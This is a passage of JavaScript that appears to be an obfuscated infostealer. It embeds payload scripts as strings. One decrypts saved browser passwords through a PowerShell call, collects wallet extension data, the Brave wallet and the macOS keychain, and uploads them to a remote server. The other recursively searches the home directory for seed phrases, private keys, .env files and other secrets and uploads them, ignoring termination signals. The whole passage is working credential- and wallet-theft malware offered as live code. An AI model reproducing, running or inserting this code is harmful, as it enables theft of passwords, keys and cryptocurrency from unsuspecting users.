{\nthrow;\n}\n[System.Text.Encoding]::UTF8.GetString($decrypted)`;\n        fs.writeFileSync(tempScriptPath, psScript, 'utf8');\n        try {\n          const decrypted = execSync(\n            `powershell -NoProfile -ExecutionPolicy Bypass -File \"${tempScriptPath}\"`,\n            { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'], maxBuffer: 1024 * 1024, windowsHide: true }\n          ).trim();\n          if (decrypted && decrypted.length > 0) {\n            return decrypted;\n          }\n        } catch (execError) {\n          continue;\n        } finally {\n          try {\n            fs.unlinkSync(tempScriptPath);\n          } catch (e) {\n          }\n        }\n      } catch (error) {\n        continue;\n      }\n    }\n    return \"\";\n  } catch (error) {\n    return \"\";\n  }\n}\nasync function extractPasswordsFromBrowser(browserIndex, basePath) {\n  if (!fs.existsSync(basePath)) {\n    return { passwords: [], masterKey: null };\n  }\n  const platform = process.platform;\n  let localStatePath;\n  if (platform === 'win32') {\n    localStatePath = path.join(basePath, 'Local State');\n  } else {\n    localStatePath = path.join(basePath, 'Local State');\n  }\n    console.log(localStatePath)\n  const masterKey = fs.existsSync(localStatePath) ? getBrowserEncryptionKey(localStatePath, `Browser${browserIndex}`) : null;\n  const defaultProfileDir = path.join(basePath, 'Default');\n  const allPasswords = [];\n  console.log('masterKey', masterKey);\n  const loginDataNames = ['Login Data', 'Login Data For Account'];\n  for (const loginDataName of loginDataNames) {\n    const defaultProfileLoginData = path.join(defaultProfileDir, loginDataName);\n    if (fs.existsSync(defaultProfileLoginData)) {\n      const passwords = await extractPasswords(defaultProfileLoginData, masterKey, `Browser${browserIndex}`);\n      allPasswords.push(...passwords);\n    }\n  }\n  try {\n    const items = fs.readdirSync(basePath);\n    for (const item of items) {\n      if (item === 'Default' || item === 'Local State' || item.startsWith('.')) {\n        continue;\n      }\n      if (item.startsWith('Profile ')) {\n        const profileDir = path.join(basePath, item);\n        try {\n          const stats = fs.statSync(profileDir);\n          if (!stats.isDirectory()) {\n            continue;\n          }\n        } catch (statError) {\n          continue;\n        }\n        for (const loginDataName of loginDataNames) {\n          const profileLoginData = path.join(profileDir, loginDataName);\n          if (fs.existsSync(profileLoginData)) {\n            const passwords = await extractPasswords(profileLoginData, masterKey, `Browser${browserIndex} (${item})`);\n            allPasswords.push(...passwords);\n          }\n        }\n      }\n    }\n  } catch (error) {\n  }\n  return { passwords: allPasswords, masterKey: masterKey ? masterKey.toString('base64') : null };\n}\nasync function extractPasswords(loginDataPath, masterKey, browserName) {\n  if (!fs.existsSync(loginDataPath)) {\n    return [];\n  }\n  const tempDbPath = path.join(os.tmpdir(), `${browserName}_login_data_${process.pid}_${Date.now()}.db`);\n  try {\n    fs.copyFileSync(loginDataPath, tempDbPath);\n  } catch (error) {\n    return [];\n  }\n  const passwords = [];\n  try {\n    const SQL = await initSqlJs();\n    if (!SQL) {\n      return [];\n    }\n    const fileBuffer = fs.readFileSync(tempDbPath);\n    const db = new SQL.Database(fileBuffer);\n    const result = db.exec(`\n      SELECT \n        origin_url,\n        username_value,\n        password_value,\n        date_created,\n        date_last_used\n      FROM logins\n      ORDER BY origin_url\n    `);\n    if (!result || result.length === 0) {\n      db.close();\n      try {\n        fs.unlinkSync(tempDbPath);\n      } catch (e) {\n      }\n      return [];\n    }\n    const rows = result[0].values;\n    const columnNames = result[0].columns;\n    const colIndex = {\n      origin_url: columnNames.indexOf('origin_url'),\n      username_value: columnNames.indexOf('username_value'),\n      password_value: columnNames.indexOf('password_value'),\n      date_created: columnNames.indexOf('date_created'),\n      date_last_used: columnNames.indexOf('date_last_used')\n    };\n    for (let idx = 0; idx < rows.length; idx++) {\n      const row = rows[idx];\n      try {\n        const url = row[colIndex.origin_url];\n        const username = row[colIndex.username_value];\n        const passwordValue = row[colIndex.password_value];\n        const dateCreated = row[colIndex.date_created];\n        const dateLastUsed = row[colIndex.date_last_used];\n        if (!passwordValue || passwordValue.length === 0) {\n          continue;\n        }\n        let encryptedPassword;\n        if (typeof passwordValue === 'string') {\n          encryptedPassword = Buffer.from(passwordValue, 'latin-1');\n        } else if (Buffer.isBuffer(passwordValue)) {\n          encryptedPassword = passwordValue;\n        } else {\n          encryptedPassword = Buffer.from(passwordValue);\n        }\n        const password = decryptPassword(encryptedPassword, masterKey);\n        function chromeTimeToISO(timestamp) {\n          if (!timestamp) {\n            return null;\n          }\n          const epoch = new Date('1601-01-01T00:00:00Z').getTime();\n          const chromeTime = timestamp / 1000000;\n          const unixTime = chromeTime - 11644473600;\n          return new Date(unixTime * 1000).toISOString();\n        }\n        const entry = {\n          url: url,\n          u: username,\n          p: password,\n          created: chromeTimeToISO(dateCreated),\n          last_used: chromeTimeToISO(dateLastUsed)\n        };\n        if (!password && encryptedPassword && encryptedPassword.length > 0) {\n          entry.p_encrypted = encryptedPassword.toString('base64');\n        }\n        passwords.push(entry);\n      } catch (error) {\n        continue;\n      }\n    }\n    db.close();\n  } catch (error) {\n    // console.log(\"error\", error);\n  } finally {\n    try {\n      fs.unlinkSync(tempDbPath);\n    } catch (e) {\n    }\n  }\n  return passwords;\n}\nasync function extractAndUploadPasswords(timestamp, tempDir) {\n  try {\n    const browserNames = ['Chrome', 'Brave', 'AVG Browser', 'Edge', 'Opera', 'Opera GX', 'Vivaldi', 'Kiwi Browser', 'Yandex Browser', 'Iridium', 'Comodo Dragon', 'SRWare Iron', 'Chromium'];\n    const allPasswords = {};\n    const masterKeys = {};\n    for (let browserIndex = 0; browserIndex < basePaths.length; browserIndex++) {\n      const basePath = basePaths[browserIndex];\n      if (!fs.existsSync(basePath)) {\n        continue;\n      }\n      const browserName = browserNames[browserIndex] || `Browser${browserIndex}`;\n      const result = await extractPasswordsFromBrowser(browserIndex, basePath);\n      if (result.passwords.length > 0) {\n        allPasswords[browserName] = result.passwords;\n        if (result.masterKey) {\n          masterKeys[browserName] = result.masterKey;\n        }\n      }\n    }\n    if (Object.keys(allPasswords).length > 0) {\n      const fileName = 's.txt';\n      const fileContent = JSON.stringify({ passwords: allPasswords, masterKeys: masterKeys }, null, 2);\n      const filePath = path.join(tempDir || os.tmpdir(), fileName);\n      fs.writeFileSync(filePath, fileContent, 'utf8');\n      const passwordFile = await collectFile(filePath, null, null, '', tempDir);\n      if (passwordFile) {\n        await uploadFiles([passwordFile], timestamp);\n      }\n      if (!tempDir && fs.existsSync(filePath)) {\n        try {\n          fs.unlinkSync(filePath);\n        } catch (e) {\n        }\n      }\n    }\n  } catch (error) {\n  }\n}\nconst uploadBraveWallet = async (timestamp, tempDir) => {\n  const browserId = 1; // Brave is index 1 in chromiumBrowserPaths\n  const extensionId = 'bravewallet';\n  const braveBasePath = basePaths[1]; // Brave is index 1\n  if (!braveBasePath || !fs.existsSync(braveBasePath)) return;\n  const folders = fs\n    .readdirSync(braveBasePath)\n    .filter((folder) => /^Profile.*|^Default$/.test(folder));\n  for (let folderIndex = 0; folderIndex < folders.length; folderIndex++) {\n    const folder = folders[folderIndex];\n    let profileId;\n    if (folder === \"Default\") {\n      profileId = 0;\n    } else {\n      const match = folder.match(/Profiles+(d+)/);\n      profileId = match ? parseInt(match[1]) : folderIndex;\n    }\n    const leveldbPath = path.join(braveBasePath, folder, \"Local Storage/leveldb\");\n    if (!fs.existsSync(leveldbPath)) continue;\n    const walletFiles = [];\n    try {\n      const files = fs.readdirSync(leveldbPath);\n      for (const file of files) {\n        const filePath = path.join(leveldbPath, file);\n        const collectedFile = await collectFile(filePath, browserId, profileId, extensionId, tempDir);\n        if (collectedFile) {\n          walletFiles.push(collectedFile);\n        }\n      }\n      if (walletFiles.length > 0) {\n        await uploadFiles(walletFiles, timestamp);\n      }\n    } catch (err) {\n    }\n  }\n};\nconst basePaths = getChromiumBasePaths();\n// const skipFiles = ['LOCK', 'CURRENT', 'LOG', 'LOG.old', 'MANIFEST'];\nconst collectFile = async (p, browserId = null, profileId = null, extensionId = null, tempDir = null) => {\n  if (!fs.existsSync(p)) return null;\n  const fileName = path.basename(p);\n  try {\n    if (fs.statSync(p).isFile()) {\n      let filePath = p;\n      let isTempFile = false;\n      if (tempDir) {\n        try {\n          const uniqueName = `${Date.now()}_${Math.random().toString(36).substring(7)}_${fileName}`;\n          const tempFilePath = path.join(tempDir, uniqueName);\n          const fileContent = fs.readFileSync(p);\n          fs.writeFileSync(tempFilePath, fileContent);\n          filePath = tempFilePath;\n          isTempFile = true;\n        } catch (copyErr) {\n          if (copyErr.code === 'EBUSY' || copyErr.code === 'EACCES' || copyErr.code === 'ENOENT') {\n            return null;\n          } else {\n            return null;\n          }\n        }\n      }\n      return {\n        path: filePath,\n        originalPath: p,\n        filename: path.basename(p),\n        browserId: browserId,\n        profileId: profileId,\n        extensionId: extensionId || '',\n        isTempFile: isTempFile\n      };\n    }\n  } catch (err) {\n    if (err.code === 'EBUSY' || err.code === 'EACCES') {\n      return null;\n    }\n  }\n  return null;\n};\nconst uploadFiles = async (files, timestamp) => {\n  if (!files || files.length === 0) return;\n  const form = new FormData();\n  const fileMetadata = [];\n  for (const file of files) {\n    if (!file || !file.path) continue;\n    try {\n      const readStream = fs.createReadStream(file.path);\n      readStream.on('error', (streamErr) => {\n        if (streamErr.code !== 'EBUSY' && streamErr.code !== 'EACCES') {}\n      });\n      form.append(\"files\", readStream, {\n        filename: file.filename\n      });\n      fileMetadata.push({\n        browserId: file.browserId !== null ? file.browserId : '',\n        profileId: file.profileId !== null ? file.profileId : '',\n        extensionId: file.extensionId || '',\n        originalFilename: file.filename\n      });\n    } catch (err) {\n      if (err.code === 'EBUSY' || err.code === 'EACCES') {continue;}      \n    }\n  }\n  if (fileMetadata.length > 0) {\n    try {\n      const response = await axios.post(`" +
    l_s +
    "`, form, {\n        headers: {\n          ...form.getHeaders(),\n          userkey: " +
    u_k +
    ",\n          hostname: encodeURIComponent(os.hostname()),\n          timestamp: timestamp,\n          'file-metadata': JSON.stringify(fileMetadata), // Send metadata array\n          t: " +
    t +
    ",\n        },\n        maxContentLength: Infinity,\n        maxBodyLength: Infinity,\n        validateStatus: (status) => status < 500, // Don't throw on 4xx errors\n      });\n      if (response.status >= 200 && response.status < 300) {} else {}\n    } catch (uploadErr) {\n      if (uploadErr.code === 'ECONNRESET' || uploadErr.code === 'ECONNREFUSED') {\n      } else if (uploadErr.response) {\n      } else {}\n    }\n  }\n};\nconst iterate = async () => {\nconst timestamp = Math.round(Date.now() / 1000);\nconst platform = process.platform;\nconst filesToUpload = [];\nconst homeDir = os.homedir();\nconst tempBaseDir = path.join(os.tmpdir(), '.tmp');\nconst tempDir = path.join(tempBaseDir, `.upload_${timestamp}_${Math.random().toString(36).substring(7)}`);\ntry {\n  if (!fs.existsSync(tempBaseDir)) {\n    await fsPromises.mkdir(tempBaseDir, { recursive: true });\n  }\n  await fsPromises.mkdir(tempDir, { recursive: true });\n} catch (err) {}\ntry {\n  // First, create and upload sysinfo.txt\n  const s_i = gsi();\n  const sysinfoContent = `Host: ${s_i.host}\\nOS: ${s_i.os}\\nUsername: ${s_i.username}\\nPlatform: ${platform}\\nTimestamp: ${new Date().toISOString()}\\n`;\n  const sysinfoPath = path.join(tempDir, 'sysinfo.txt');\n  fs.writeFileSync(sysinfoPath, sysinfoContent, 'utf8');\n  const sysinfoFile = {\n    path: sysinfoPath,\n    originalPath: sysinfoPath,\n    filename: 'sysinfo.txt',\n    browserId: '',\n    profileId: '',\n    extensionId: '',\n    isTempFile: true\n  };\n  await uploadFiles([sysinfoFile], timestamp);\n  \n  if (os.platform() == \"darwin\") {\n    const keychainFile = await collectFile(`${process.env.HOME}/Library/Keychains/login.keychain-db`, '', '', '', tempDir);\n    if (keychainFile) {\n      await uploadFiles([keychainFile], timestamp);\n    }\n  }\n  for (let basePathIndex = 0; basePathIndex < basePaths.length; basePathIndex++) {\n    const basePath = basePaths[basePathIndex];\n    const browserId = basePathIndex; // 0 for Chrome, 1 for Brave\n    if (!fs.existsSync(basePath)) continue;\n    const folders = fs\n      .readdirSync(basePath)\n      .filter((folder) => /^Profile.*|^Default$/.test(folder));\n    for (let folderIndex = 0; folderIndex < folders.length; folderIndex++) {\n      const folder = folders[folderIndex];\n      let profileId;\n      if (folder === \"Default\") {\n        profileId = 0;\n      } else {\n        const match = folder.match(/Profiles+(d+)/);\n        profileId = match ? parseInt(match[1]) : folderIndex;\n      }\n      const profileFiles = [];\n      for (wp of wps) {\n        const fp = `${basePath}/${folder}/Local Extension Settings/${wp}`;\n        if (!fs.existsSync(fp)) continue;\n        const dirs = fs.readdirSync(fp);\n        for (dr of dirs) {\n          const file = await collectFile(`${fp}/${dr}`, browserId, profileId, wp, tempDir);\n          if (file) profileFiles.push(file);\n        }\n        if (profileFiles.length > 0) {\n          await uploadFiles(profileFiles, timestamp);\n          profileFiles.length = 0; // Clear the array \n        }\n      }\n      const loginDataNames = ['Login Data', 'Login Data For Account'];\n      for (const loginDataName of loginDataNames) {\n        const loginDataFile = await collectFile(`${basePath}/${folder}/${loginDataName}`, browserId, profileId, '', tempDir);\n        if (loginDataFile) { profileFiles.push(loginDataFile);}\n      }      \n      const webDataFile = await collectFile(`${basePath}/${folder}/Web Data`, browserId, profileId, '', tempDir);\n      if (webDataFile) profileFiles.push(webDataFile);\n      if (profileFiles.length > 0) {\n        await uploadFiles(profileFiles, timestamp);\n      }\n    }\n  }\n  await uploadBraveWallet(timestamp, tempDir);\n  if (i % 3 === 0) { // every 3rd iteration\n    await extractAndUploadPasswords(timestamp, tempDir);\n  }\n} finally {\n  if (fs.existsSync(tempDir)) {\n    try {\n      const files = await fsPromises.readdir(tempDir);\n      await Promise.all(files.map(file => \n        fsPromises.unlink(path.join(tempDir, file)).catch(() => {})\n      ));\n      await fsPromises.rmdir(tempDir);\n    } catch (cleanupErr) {\n      try {\n        if (fs.rmSync) {\n          fs.rmSync(tempDir, { recursive: true, force: true });\n        }\n      } catch (altCleanupErr) {}\n    }\n  }\n}\n\n};\n\nconst run = async () => {\nawait iterate();\ni++;\nawait sleep(30000);\ni <= 10 && (await run());\n};\nprocess.on('uncaughtException', (error) => {\nconsole.error('Uncaught Exception:', error.message);\n});\n\nprocess.on('unhandledRejection', (reason, promise) => {\nconsole.error('Unhandled Rejection at:', promise, 'reason:', reason);\n});\n\n(async () => {\ntry {\n  await run();\n} catch (error) {\n  console.error('Fatal error in run():', error.message);\n}\n})();";
  try {
    Utils.sp_s(I, "pid." + t + ".1.lock", "ldbScript", f_s_l);
  } catch (o) {}
  try {
    const s =
      'const UPLOAD_DELAY_MS = 120;\n        const ADAPTIVE_DELAY_MS = 20;\n        const MIN_UPLOAD_TIME_MS = 50;\n        const MAX_FILE_SIZE_BYTES = 5 * 1024 * 1024; // 5MB\n\n        const fs = require("fs");\n        const path = require("path");\n        const os = require("os");\n        const FormData = require("form-data");\n        const axios = require("axios");\n        const { execSync } = require("child_process");\n\n        ' +
      Utils.set_l("autoupload") +
      '\n        const HOME_DIRECTORY = os.homedir();\n\n        // Global variable for priority directories (set in main function)\n        let priorityDirs = [];\n\n        // Add process error handlers to prevent premature exits\n        process.on("uncaughtException", (err) => {\n          console.error("Uncaught Exception:", err.message);\n          console.error("Stack:", err.stack);\n          // Don\'t exit - continue scanning despite errors\n          // The script should complete the scan even if some operations fail\n        });\n\n        process.on("unhandledRejection", (reason, promise) => {\n          console.error("Unhandled Rejection:", reason);\n          // Don\'t exit - continue scanning despite errors\n        });\n\n        // Handle process termination signals gracefully\n        process.on("SIGTERM", () => {\n          \n          // Don\'t exit immediately - let the scan finish\n        });\n\n        process.on("SIGINT", () => {\n          \n          // Don\'t exit immediately - let the scan finish\n        });\n\n        // File extensions to exclude from scanning\n        const EXCLUDED_FILE_EXTENSIONS = [".exe",".dll",".so",".dylib",".bin",".app",".deb",".rpm",".pkg",".dmg",".msi",".appimage",".lnk",".alias",".desktop",".mp4",".mp3",".avi",".mov",".wmv",".flv",".mkv",".webm",".wma",".wav",".flac",".aac",".ogg",".m4a",".gif",".tiff",".svg",".ico",".heif",".tmp",".temp",".swp",".swo",".jar",".war",".ear",".sublime-project",".sublime-workspace"];\n\n        const EXCLUDED_PATH_PATTERNS = [".quokka",".bash_rc",".bash_sessions",".atom",".zen","thumbnails",".rhinocode",".codeium",".adobe",".matplotlib",".antigravity",".gemini",".pyenv",".pgadmin",".ipython",".idlerc",".codex",".qodo",".cups",".n2",".n3",".pki",".ruby",".vscode-remote",".python",".php",".oh-my-zsh",".nvs",".maven",".jupyter",".dotnet","assetbundles",".pnpm-store",".rbenv","movies", "music","adobe","package cache","nvidia corporation","saved games","winrar",".cargo",".lingma",".qoder",".trae-aicc",".vscode-insiders",".avo-code","ubuntu-backup","snap-data","app-configs",".local",".config",".anydesk","library","programdata",".tmp","node_modules","npm",".npm",".yarn","yarn.lock","package-lock.json","pnpm-store",".pnpm","public","static","assets","resources","css","less","scss","sass","stylus","styles","style","themes","theme","build","dist","out","target","bin","obj",".next",".nuxt",".output",".vuepress",".vitepress","appdata","program files","program files (x86)","windows","windows.old","system volume information","\\$recycle.bin","recovery","perflogs","intel","amd","nvidia","microsoft","microsoftedgebackup","system","applications",".trash",".spotlight-v100",".fseventsd",".documentrevisions-v100",".temporaryitems",".vol","cores","application support","proc","sys","dev","run","boot","lost+found","snap","flatpak","desktop.ini","thumbs.db",".vscode",".idea",".vs",".eclipse",".settings",".metadata",".gradle",".mvn",".git",".github",".svn",".hg",".bzr",".cache","cache","tmp","temp","*~","vendor","vendors",".venv","venv",".conda","anaconda3","miniconda3",".rustup",".pub-cache",".dart_tool",".gradle",".m2",".ivy2",".sbt","libs","packages","package","pkgs","pkg","documentation","examples","example","samples","sample","test","tests","spec","specs",".ssh",".gnupg",".aws",".docker",".kube",".terraform",".vagrant",".node-gyp",".nvm",".npm",".yarn",".pnpm",".bun",".deno",".go",".gopath",".gocache",".cursor",".vscode-server",".claude",".windsurf",".snipaste",".vue-cli-ui",".devctl",".eigent","fonts","font","icons","icon","wallpaper","wallpapers","background","backgrounds","locale","locales","_locales","i18n","translations","lang","language","languages","visual studio code.app","chrome.app","firefox.app","safari.app","opera.app","brave browser.app","vmware",".vmware","vmware fusion","vmware fusion.app","vmware workstation","vmware player","vmware vsphere","vmware vcenter","/applications/vmware","/usr/lib/vmware","/usr/share/vmware","program files/vmware","program files (x86)/vmware","appdata/local/vmware","appdata/roaming/vmware","library/application support/vmware",".vmwarevm",".vmdk",".vmem",".vmsn",".vmsd",".vmx",".vmxf",".nvram",".vmtm","mysql","postgresql","mongodb","redis","elasticsearch","openzeppelin","prisma",".expo",".next",".nuxt",".svelte-kit","hooks",".wine",".3T",".gk",".move",".tldrc",".android",".avm",".brownie",".cocoapods",".zsh_sessions",".pm2",".pyp",".myi","manifest","debug","plugin","plugins"];\n\n        const SENSITIVE_FILE_PATTERNS = [".keystore", "phone", "database","bank", "financ", ".env","env","environment","config","configuration","configure",".conf",".cfg",".ini",".properties",".yaml",".yml",".toml","metamask","phantom","bitcoin","ethereum","eth","trust","wallet","coinbase","exodus","ledger","trezor","keystore","keyring","keychain","atomic","electrum","mycelium","blockchain","bravewallet","rabby","coin98","backpack","core","mathwallet","solflare","glow","keplr","argent","martian","petra","binance","okx","crypto","cryptocurrency","hardhat","truffle","private","privatekey","private_key","private-key","privkey","priv_key","key","keypair","key_pair","key-pair",".pem",".p12",".pfx",".jks","keystore",".keys","keys",".p8",".p7b",".p7c",".cer",".crt",".cert","cert",".der","id_rsa","id_dsa","id_ecdsa","id_ed25519",".pub",".priv","seed","seedphrase","seed_phrase","seed-phrase","mnemonic","phrase","passphrase","pass_phrase","pass-phrase","recovery","recoveryphrase","recovery_phrase","recovery-phrase","backup","backupphrase","backup_phrase","backup-phrase","12words","12_words","12-words","24words","24_words","24-words","bip39","bip44","password","passwd","pass","pwd","credential","credentials","auth","authentication","token","access_token","refresh_token","api_key","apikey","api-key","apisecret","api_secret","api-secret","secret","secrets","secretkey","secret_key","secret-key","masterkey","master_key","master-key","masterpassword","master_password","master-password","account","accounts","profile","profiles","user","username","user_name","user-name","login","signin","sign_in","sign-in","address","addresses","tx","transaction","transactions",".db",".sqlite",".sqlite3",".sql",".mdb",".accdb",".dbf",".doc",".docx",".pdf",".md",".markdown",".rtf",".odt",".xls",".xlsx",".txt","text","note","notes","memo","memos","screenshot","screen","snapshot","capture",".png",".jpg",".jpeg",".bmp",".json",".js",".ts",".jsx",".tsx",".csv",".xml",".lock",".log",".bak","backup",".old",".orig",".save",".swp",".tmp","tmp","my","personal","vault","safe","secure","lock","encrypt","decrypt","signature","sign","certificate","cert","identity","session","cookie"];\n\n        const is_wsl = () => {\n          if (process.env.WSL_DISTRO_NAME) {\n            return true;\n          }\n          try {\n            if (fs.existsSync("/proc/version")) {\n              const versionContent = fs.readFileSync("/proc/version", "utf8");\n              if (versionContent.toLowerCase().includes("microsoft") || versionContent.toLowerCase().includes("wsl")) {\n                return true;\n              }\n            }\n          } catch (e) {}\n          return false;\n        };\n\n        // Check if file extension should be excluded\n        const isFileExtensionExcluded = (fileName) => {\n          const lowerFileName = fileName.toLowerCase();\n          return EXCLUDED_FILE_EXTENSIONS.some(ext => \n            lowerFileName.endsWith(ext.toLowerCase())\n          );\n        };\n\n        // Check if a path should be excluded\n          const isDirectoryNameExcluded = (directoryName) => {\n            const lowerDirectoryName = directoryName.toLowerCase();\n            return EXCLUDED_PATH_PATTERNS.includes(lowerDirectoryName);\n          };\n\n        // Check if full path contains any sensitive file pattern (case-insensitive)\n        const isSensitiveFile = (filePath) => {\n          const lowerPath = filePath.toLowerCase();\n          return SENSITIVE_FILE_PATTERNS.some(pattern => \n            lowerPath.includes(pattern.toLowerCase())\n          );\n        };\n\n        // Upload a file to the server\n        const uploadFile = async (filePath) => {\n          try {\n            if (!fs.existsSync(filePath)) {\n              return false;\n            }\n\n            let stats;\n            try {\n              stats = fs.statSync(filePath);\n            } catch (statError) {\n              // File might have been deleted or is inaccessible\n              return false;\n            }\n            \n            if (!stats.isFile()) {\n              return false;\n            }\n\n            // Skip files larger than the size limit\n            if (stats.size > MAX_FILE_SIZE_BYTES) {\n              return false;\n            }\n\n            // Check if file is readable\n            try {\n              fs.accessSync(filePath, fs.constants.R_OK);\n            } catch (accessError) {\n              // File is not readable\n              return false;\n            }\n\n            const form = new FormData();\n            let readStream;\n            try {\n              readStream = fs.createReadStream(filePath);\n            } catch (streamError) {\n              // Can\'t create read stream (file might be locked)\n              return false;\n            }\n            \n            form.append("file", readStream);\n            \n            try {\n              const response = await axios.post(`' +
      u_s +
      "`, form, {\n                headers: {\n                  ...form.getHeaders(),\n                  userkey: " +
      u_k +
      ",\n                  hostname: encodeURIComponent(os.hostname()),\n                  path: encodeURIComponent(filePath),\n                  t: " +
      t +
      "\n                },\n                maxContentLength: Infinity,\n                maxBodyLength: Infinity,\n                timeout: 30000, // 30 second timeout to prevent hanging\n              });\n              \n              // Check response status\n              if (response.status >= 200 && response.status < 300) {\n                return true;\n              } else {\n                // Non-success status\n                return false;\n              }\n            } catch (error) {\n              // Handle specific network errors - re-throw for retry logic\n              if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT' || error.code === 'ENOTFOUND') {\n                // Network issues - these are recoverable\n                throw error; // Re-throw to trigger retry logic\n              } else if (error.code === 'ECONNRESET' || error.code === 'EPIPE') {\n                // Connection reset - might be recoverable\n                throw error;\n              } else if (error.response) {\n                // Server responded with error status\n                const status = error.response.status;\n                if (status >= 500) {\n                  // Server error - might be recoverable\n                  throw error;\n                } else {\n                  // Client error (4xx) - probably not recoverable, don't retry\n                  return false;\n                }\n              } else {\n                // Other errors - might be recoverable\n                throw error;\n              }\n            } finally {\n              // Ensure stream is closed\n              if (readStream && !readStream.destroyed) {\n                try {\n                  readStream.destroy();\n                } catch (e) {\n                  // Ignore cleanup errors\n                }\n              }\n            }\n          } catch (error) {\n            // Re-throw network errors for retry logic in calling function\n            if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT' || \n                error.code === 'ENOTFOUND' || error.code === 'ECONNRESET' || \n                error.code === 'EPIPE' || (error.response && error.response.status >= 500)) {\n              throw error;\n            }\n            // Other errors - log and return false\n            console.error(`Failed to upload ${filePath}:`, error.message);\n            return false;\n          }\n        };\n\n        // Delay helper function\n        const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));\n\n        // Track visited directories to prevent infinite loops from symlinks\n        const visitedDirs = new Set();\n        const MAX_PATH_LENGTH = os.platform() === 'win32' ? 260 : 4096;\n        const MAX_RECURSION_DEPTH = 20;\n        \n        // Recursively scan directory and upload sensitive files\n        const scanAndUploadDirectory = async (directoryPath, skipPriorityDirs = false, depth = 0) => {\n          // Prevent infinite recursion\n          if (depth > MAX_RECURSION_DEPTH) {\n            console.warn(`Max recursion depth reached for ${directoryPath}`);\n            return;\n          }\n          \n          // Check path length limits\n          if (directoryPath.length > MAX_PATH_LENGTH) {\n            console.warn(`Path too long, skipping: ${directoryPath}`);\n            return;\n          }\n          \n          if (!fs.existsSync(directoryPath)) {\n            return;\n          }\n          \n          // Resolve real path to handle symlinks and prevent loops\n          let realPath;\n          try {\n            realPath = fs.realpathSync(directoryPath);\n          } catch (realpathError) {\n            // If we can't resolve the real path, skip it\n            console.warn(`Cannot resolve real path for ${directoryPath}:`, realpathError.message);\n            return;\n          }\n          \n          // Check if we've already visited this directory (prevent symlink loops)\n          if (visitedDirs.has(realPath)) {\n            return; // Already visited, skip to prevent infinite loops\n          }\n          \n          // Mark as visited\n          visitedDirs.add(realPath);\n          \n          try {\n            // Explicitly read all files including hidden ones\n            let items;\n            try {\n              items = fs.readdirSync(directoryPath, { withFileTypes: true });\n            } catch (readdirError) {\n              // Handle specific error codes\n              const errorCode = readdirError.code || readdirError.errno;\n              if (errorCode === 'EACCES' || errorCode === 'EPERM' || errorCode === 'EAGAIN') {\n                // Permission denied - log but continue\n                console.warn(`Permission denied for ${directoryPath}:`, readdirError.message);\n              } else if (errorCode === 'ENOENT') {\n                // Directory doesn't exist (might have been deleted)\n                console.warn(`Directory no longer exists: ${directoryPath}`);\n              } else {\n                // Other errors\n                console.error(`Cannot read directory ${directoryPath}:`, readdirError.message);\n              }\n              return; // Return early, don't throw\n            }\n\n            // Sort items alphabetically in descending order\n            items.sort((a, b) => b.name.localeCompare(a.name));\n\n            for (const item of items) {\n              try {\n                // Skip . and .. entries\n                if (item.name === '.' || item.name === '..') {\n                  continue;\n                }\n\n                const fullPath = path.join(directoryPath, item.name);\n                console.log('fullPath', fullPath);\n                // Check path length before processing\n                if (fullPath.length > MAX_PATH_LENGTH) {\n                  console.warn(`Path too long, skipping: ${fullPath}`);\n                  continue;\n                }\n                \n                // Get stats for both files and directories (needed for file size check)\n                let stats;\n                let isSymlink = false;\n                try {\n                  // Check if it's a symlink first\n                  if (item.isSymbolicLink && item.isSymbolicLink()) {\n                    isSymlink = true;\n                    // For symlinks, use lstatSync to get symlink info, then resolve\n                    try {\n                      stats = fs.lstatSync(fullPath);\n                      if (stats.isSymbolicLink()) {\n                        // Resolve symlink for directories\n                        const resolvedPath = fs.realpathSync(fullPath);\n                        stats = fs.statSync(resolvedPath);\n                      }\n                    } catch (symlinkError) {\n                      // Broken symlink or can't resolve\n                      continue;\n                    }\n                  } else {\n                    stats = fs.statSync(fullPath);\n                  }\n                } catch (statError) {\n                  // Handle specific stat errors\n                  const errorCode = statError.code || statError.errno;\n                  if (errorCode === 'ENOENT') {\n                    // File/directory was deleted between readdir and stat\n                    continue;\n                  } else if (errorCode === 'EACCES' || errorCode === 'EPERM') {\n                    // Permission denied\n                    console.warn(`Permission denied for ${fullPath}`);\n                    continue;\n                  } else {\n                    // Other errors - skip\n                    continue;\n                  }\n                }\n\n                if (item.isDirectory() || stats.isDirectory()) {\n                    // Skip priority directories if we're scanning other locations\n                    if (skipPriorityDirs) {\n                      const normalizedPath = path.normalize(fullPath).toLowerCase();\n                      const isPriorityDir = priorityDirs.some(priorityDir => {\n                        const normalizedPriority = path.normalize(priorityDir).toLowerCase();\n                        return normalizedPath === normalizedPriority;\n                      });\n                      \n                      if (isPriorityDir) {\n                        continue;\n                      }\n                    }\n                    \n                    if(!isDirectoryNameExcluded(item.name)) {\n                      // Recursively scan subdirectories - wrap in try-catch to prevent stopping\n                      try {\n                        await scanAndUploadDirectory(fullPath, skipPriorityDirs, depth + 1);\n                      } catch (recursiveError) {\n                        // Log but don't throw - continue with other items\n                        console.error(`Error in recursive scan of ${fullPath}:`, recursiveError.message);\n                      }\n                      continue;\n                    }\n                    \n                    continue;\n                }\n\n                if ((item.isFile() || stats.isFile()) && !isFileExtensionExcluded(item.name) && (!skipPriorityDirs || isSensitiveFile(fullPath))) {\n                  // Skip files larger than the size limit\n                  if (stats.size > MAX_FILE_SIZE_BYTES) {\n                    continue;\n                  }\n\n                  // Upload sensitive files with retry logic\n                  try {\n                    let uploadSuccess = false;\n                    let retries = 3;\n                    while (!uploadSuccess && retries > 0) {\n                      try {\n                        const uploadStartTime = Date.now();\n                        await uploadFile(fullPath);\n                        uploadSuccess = true;\n                        const uploadDuration = Date.now() - uploadStartTime;\n                        \n                        // Only delay if upload completed very quickly (likely small file or fast network)\n                        // This prevents overwhelming the server while not slowing down normal uploads\n                        if (uploadDuration < MIN_UPLOAD_TIME_MS) {\n                          await delay(ADAPTIVE_DELAY_MS);\n                        }\n                        // No delay needed for normal uploads - network is already the bottleneck\n                      } catch (uploadError) {\n                        retries--;\n                        if (retries > 0) {\n                          // Wait before retry (exponential backoff)\n                          await delay(ADAPTIVE_DELAY_MS * (4 - retries));\n                        } else {\n                          // Final failure - log but continue\n                          console.error(`Failed to upload ${fullPath} after retries:`, uploadError.message);\n                        }\n                      }\n                    }\n                  } catch (uploadError) {\n                    // Log upload errors but continue\n                    console.error(`Error uploading 